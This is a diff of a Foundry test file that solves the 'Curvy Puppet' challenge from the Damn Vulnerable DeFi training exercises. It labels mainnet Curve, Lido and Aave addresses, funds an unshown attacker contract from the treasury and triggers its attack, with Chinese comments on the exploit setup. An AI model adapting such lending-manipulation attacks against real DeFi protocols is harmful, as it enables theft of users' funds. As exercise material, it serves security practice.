@@ -9,6 +9,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
+import {CurvyPuppetAttacker} from "./CurvyPuppetAttacker.sol";
 
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -24,6 +25,7 @@ contract CurvyPuppetChallenge is Test {
 
     // Relevant Ethereum mainnet addresses
     IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
+    // stETH/ETH pool（0xDC24…F67022）的 Vyper 源码
     IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
     IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
     WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
@@ -61,6 +63,7 @@ contract CurvyPuppetChallenge is Test {
 
         // Deploy price oracle and set prices for ETH and DVT
         oracle = new CurvyPuppetOracle();
+        // 这里写死了价格，所以oracle不能动手脚了
         oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
         oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});
 
@@ -158,7 +161,27 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        vm.label(address(curvePool),                         "CurvePool_stETH_ETH");
+        vm.label(curvePool.lp_token(),                       "steCRV_LP");
+        vm.label(address(stETH),                             "stETH_Proxy");
+        vm.label(0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc, "Lido_Kernel");
+        vm.label(0x2b33CF282f867A7FF693A66e11B0FcC5552e4425, "Lido_KernelImpl");
+        vm.label(0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb, "stETH_Impl");
+        vm.label(address(weth),                              "WETH9");
+        vm.label(address(permit2),                           "Permit2");
+        vm.label(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e, "Aave2_aWETH");
+        vm.label(0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, "Aave3_aWETH");
+        vm.label(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9, "AaveV2_Pool");
+        vm.label(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2, "AaveV3_Pool");
+
+        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
+            weth, curvePool, lending, IERC20(curvePool.lp_token()), address(permit2), address(dvt), treasury, [alice, bob, charlie]
+        );
+        // Treasury 已 approve player，留 1 wei 满足 _isSolved 的 assertGt
+        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE - 1);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE - 1);
+        deal(address(weth), address(attacker), weth.balanceOf(address(attacker)) + 600e18);
+        attacker.attack();
     }
 
     /**
